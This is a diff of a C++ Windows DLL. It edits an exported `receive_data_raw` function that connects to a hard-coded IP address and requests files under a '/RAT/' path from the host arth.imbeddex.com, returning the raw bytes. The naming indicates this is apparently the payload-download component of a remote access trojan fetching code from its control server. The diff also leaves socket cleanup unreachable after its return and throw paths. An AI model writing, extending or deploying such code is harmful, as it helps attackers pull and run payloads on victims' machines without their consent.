@@ -163,15 +163,40 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
 
 __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
 {
-    std::lock_guard<std::mutex> lock(socketMutex);
+    std::lock_guard<std::mutex> lock1(socketMutex);
 
+    //////////////////////////////////////////////////////////////////////////////////////////////////
+    SOCKET TempSocket = INVALID_SOCKET;
+    TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (TempSocket == INVALID_SOCKET)
+    {
+        std::cerr << "Socket creation failed.\n";
+        WSACleanup();
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(80);
+    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
+
+    while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+        int error = WSAGetLastError();
+        if (error != WSAECONNREFUSED)
+            std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
+        else
+            std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+        Sleep(2000);
+    }
+
+    ///////////////////////////////////////////////////////////////////////////////////////////////////
 
     // Send HTTP GET request
     std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: keep-alive\r\n\r\n";
+    httpRequest += "Connection: close\r\n\r\n";
 
-    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+    int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
     if (bytesSent == SOCKET_ERROR)
     {
         int error = WSAGetLastError();
@@ -184,19 +209,21 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
     std::vector<unsigned char> receivedData;
     int bytesReceived;
 
-    while (true) {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) {
-            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
-        } else if (bytesReceived == 0) {
-            //std::cerr << "Connection closed by server." << std::endl;
+    do {
+        bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
+        if (bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
+        else if (bytesReceived == 0)
+        {
+            //std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
             break;
-        } else {
+        }
+        else
+        {
             int error = WSAGetLastError();
             std::cerr << "Receive failed with error: " << error << std::endl;
             break;
         }
-    }
+    } while (bytesReceived > 0);
 
     // Ensure header separator is found
     size_t headerEnd = 0;
@@ -212,32 +239,32 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
         }
     }
 
-    if (headerEnd != 0) 
-    {
-        //cout << "Header found at position: " << headerEnd << std::endl;
-    }
-    else
+    if (headerEnd == 0)
     {
         std::cerr << "Header separator not found." << std::endl;
-        receivedData.clear();
-        return std::vector<unsigned char>();
+        throw std::runtime_error("Header separator not found");
     }
 
-    // Make sure headerEnd + 4 is within the bounds of the receivedData
-    if (headerEnd <= receivedData.size())
+    // Make sure headerEnd is within the bounds of the receivedData
+    if (headerEnd < receivedData.size())
     {
         // Extract body after header (start from headerEnd)
         std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
-
+        
         return body; // Return the extracted body
     }
-    else {
+    else
+    {
         std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
-        receivedData.clear();
-        return std::vector<unsigned char>();
+        throw std::runtime_error("Body extraction failed");
     }
-    
-    return std::vector<unsigned char>();
+
+    if (TempSocket != INVALID_SOCKET)
+    {
+        shutdown(TempSocket, SD_BOTH);
+        closesocket(TempSocket);
+        TempSocket = INVALID_SOCKET;
+    }
 }
 
 BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
